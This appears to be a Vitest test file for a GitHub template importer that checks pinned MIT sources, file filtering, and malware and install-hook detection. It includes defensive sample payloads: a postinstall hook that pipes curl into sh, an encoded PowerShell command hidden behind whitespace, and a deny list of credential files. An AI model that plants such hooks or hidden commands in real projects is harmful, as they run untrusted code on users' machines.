import { createHash } from "node:crypto";
import { afterEach, describe, expect, it, vi } from "vitest";
import { GITHUB_APP_TEMPLATES, findGithubAppTemplate } from "@/lib/projects/github-app-templates";
import {
  isAllowedGithubTemplateFile,
  importGithubTemplateSource,
  validateImportedGithubFiles,
} from "@/lib/projects/import-github-template";

function gitBlobSha(content: string) {
  return createHash("sha1").update(`blob ${Buffer.byteLength(content)}`).update(Buffer.from([0])).update(content).digest("hex");
}

const files = [
  { path: "package.json", content: JSON.stringify({ dependencies: { next: "15.5.20", react: "19.1.0" }, scripts: { build: "next build" } }) },
  { path: "src/app/page.tsx", content: "export default function Page(){ return <p>Test</p> }" },
  { path: "src/app/layout.tsx", content: "export default function Layout({children}:{children: React.ReactNode}){return <html><body>{children}</body></html>}" },
];

afterEach(() => vi.unstubAllGlobals());

describe("curated GitHub app templates", () => {
  it("pins reviewed public MIT sources rather than accepting arbitrary URLs", () => {
    expect(GITHUB_APP_TEMPLATES).toHaveLength(5);
    for (const template of GITHUB_APP_TEMPLATES) {
      expect(template.commit).toMatch(/^[a-f0-9]{40}$/);
      expect(["vercel/next.js", "shadcn-ui/chatbot-template", "thorchh/agent-starter", "AdityaKodez/gridly"]).toContain(template.repository);
      expect(template.repository === "vercel/next.js" ? template.subdirectory.startsWith("examples/") : template.subdirectory === "").toBe(true);
      expect(template.license).toBe("MIT");
      expect(template.sourceUrl).toContain(template.commit);
    }
    expect(findGithubAppTemplate("not-approved")).toBeUndefined();
  });

  it("rejects hidden credentials, CI workflows and package manager lockfiles", () => {
    for (const name of [".env", ".env.production", ".dev.vars", ".npmrc", ".github/workflows/evil.yml", "package-lock.json", "pnpm-lock.yaml", "node_modules/x.js", "logo.png", "image.webp", "../escape.ts"]) {
      expect(isAllowedGithubTemplateFile(name)).toBe(false);
    }
    expect(isAllowedGithubTemplateFile("src/app/page.tsx")).toBe(true);
    expect(isAllowedGithubTemplateFile(".env.example")).toBe(true);
    expect(isAllowedGithubTemplateFile("prisma/schema.prisma")).toBe(true);
    expect(isAllowedGithubTemplateFile("prisma/migrations/v1/migration.sql")).toBe(true);
    expect(isAllowedGithubTemplateFile(".idea/config.json")).toBe(false);
  });

  it("enforces a real Next.js App Router project and rejects install-time hooks", () => {
    expect(() => validateImportedGithubFiles(files)).not.toThrow();
    const grouped = files.map((f) => f.path === "src/app/page.tsx" ? { ...f, path: "app/(marketing)/page.tsx" } : f);
    expect(() => validateImportedGithubFiles(grouped)).not.toThrow();
    expect(() => validateImportedGithubFiles(files.slice(0, 2))).toThrow(/complete supported/);
    const dangerous = { path: "package.json", content: JSON.stringify({
      dependencies: { next: "15.5.20" },
      scripts: { postinstall: "curl https://example.org/script | sh" },
    }) };
    expect(() => validateImportedGithubFiles([dangerous, ...files.slice(1)])).toThrow(/installation hooks/);
  });

  it("blocks a valid-looking GitHub starter with hidden malware before it can be saved", () => {
    const malicious = [
      files[0],
      { path: "src/app/page.tsx", content: "export default function Page(){ return null; }\n" +
        " ".repeat(160) + "powershell.exe -EncodedCommand abc" },
      files[2],
    ];
    expect(() => validateImportedGithubFiles(malicious)).toThrow(/suspicious code/i);
    const clean = validateImportedGithubFiles(files);
    expect(clean.status).toBe("no-indicators-observed");
  });

  it("copies immutable source with original license but never imports environment secrets", async () => {
    const source = GITHUB_APP_TEMPLATES[0];
    const fileNames = files.map((f) => ({ ...f, sha: gitBlobSha(f.content), size: Buffer.byteLength(f.content) }));
    const license = "The MIT License (MIT)\nCopyright (c) 2025 Vercel, Inc.\nPermission is hereby granted...";
    const responses: Record<string, unknown> = {
      [`/repos/vercel/next.js/git/commits/${source.commit}`]: { tree: { sha: "a".repeat(40) } },
      [`/repos/vercel/next.js/git/trees/${"a".repeat(40)}`]: { tree: [{ path: "examples", type: "tree", sha: "b".repeat(40) }], truncated: false },
      [`/repos/vercel/next.js/git/trees/${"b".repeat(40)}`]: { tree: [{ path: "blog-starter", type: "tree", sha: "c".repeat(40) }], truncated: false },
      [`/repos/vercel/next.js/git/trees/${"c".repeat(40)}?recursive=1`]: {
        tree: [...fileNames.map(f => ({ path: f.path, sha: f.sha, type: "blob", size: f.size })),
          { path: ".env.production", sha: "9".repeat(40), size: 10, type: "blob" },
          { path: "cover.png", sha: "8".repeat(40), size: 1250, type: "blob" }],
        truncated: false,
      },
      [`/repos/vercel/next.js/contents/license.md?ref=${source.commit}`]: {
        encoding: "base64", content: Buffer.from(license).toString("base64"),
      },
    };
    for (const f of fileNames) {
      responses[`https://raw.githubusercontent.com/vercel/next.js/${source.commit}/${source.subdirectory}/${f.path}`] = f.content;
    }
    const mockFetch = vi.fn(async (url: string) => {
      const parsed = new URL(url);
      const key = parsed.hostname === "raw.githubusercontent.com" ? url : parsed.pathname + parsed.search;
      return key in responses
        ? typeof responses[key] === "string" ? new Response(responses[key] as string) : Response.json(responses[key])
        : Response.json({ message: "Not found" }, { status: 404 });
    });
    vi.stubGlobal("fetch", mockFetch);
    const imported = await importGithubTemplateSource(source);
    expect(imported.files.map(f => f.path)).toEqual(expect.arrayContaining([
      "package.json", "src/app/page.tsx", "src/app/layout.tsx", "LICENSE", "BUILD-RX-SOURCE.md",
    ]));
    expect(imported.files.find(f => f.path === "LICENSE")?.content).toContain("MIT");
    expect(imported.files.find(f => f.path === "BUILD-RX-SOURCE.md")?.content).toContain(source.commit);
    expect(imported.files.some(f => f.path === ".env.production")).toBe(false);
    expect(imported.files.some(f => f.path === "cover.png")).toBe(false);
    expect(mockFetch.mock.calls.some(([url]) => url.includes(".env.production"))).toBe(false);
    expect(imported.skippedBinary).toBe(2);
  });

  it("imports an AI SaaS root snapshot and retains necessary Prisma source", async () => {
    const source = findGithubAppTemplate("github-ai-saas-gridly")!;
    const groupedFiles = [
      files[0],
      { ...files[1], path: "app/(marketing)/page.tsx" },
      { ...files[2], path: "app/layout.tsx" },
      { path: "prisma/schema.prisma", content: "datasource db { provider = \"postgresql\" }" },
    ];
    const descriptors = groupedFiles.map((file, index) => ({
      ...file, sha: gitBlobSha(file.content), size: Buffer.byteLength(file.content),
    }));
    const license = "MIT License\\nCopyright (c) 2026 Aditya\\nPermission is hereby granted, free of charge";
    const responses: Record<string, unknown> = {
      [`/repos/${source.repository}/git/commits/${source.commit}`]: {
        tree: { sha: "f".repeat(40) },
      },
      [`/repos/${source.repository}/git/trees/${"f".repeat(40)}?recursive=1`]: {
        tree: descriptors.map(f => ({ path: f.path, type: "blob", sha: f.sha, size: f.size })),
        truncated: false,
      },
      [`/repos/${source.repository}/contents/LICENSE?ref=${source.commit}`]: {
        encoding: "base64", content: Buffer.from(license).toString("base64"),
      },
    };
    for (const f of descriptors) {
      responses[`https://raw.githubusercontent.com/${source.repository}/${source.commit}/${f.path}`] = f.content;
    }
    const mockFetch = vi.fn(async (url: string) => {
      const request = new URL(url);
      const key = request.hostname === "raw.githubusercontent.com" ? url : request.pathname + request.search;
      return key in responses
        ? typeof responses[key] === "string" ? new Response(responses[key] as string) : Response.json(responses[key])
        : Response.json({ message: "Not found" }, { status: 404 });
    });
    vi.stubGlobal("fetch", mockFetch);
    const imported = await importGithubTemplateSource(source);
    expect(imported.files.map(f => f.path)).toContain("prisma/schema.prisma");
    expect(imported.files.find(f => f.path === "LICENSE")?.content).toContain("MIT License");
    expect(imported.sourceUrl).toContain(source.commit);
    expect(mockFetch.mock.calls.some(([url]) => url.includes("/git/trees/undefined"))).toBe(false);
  });
});
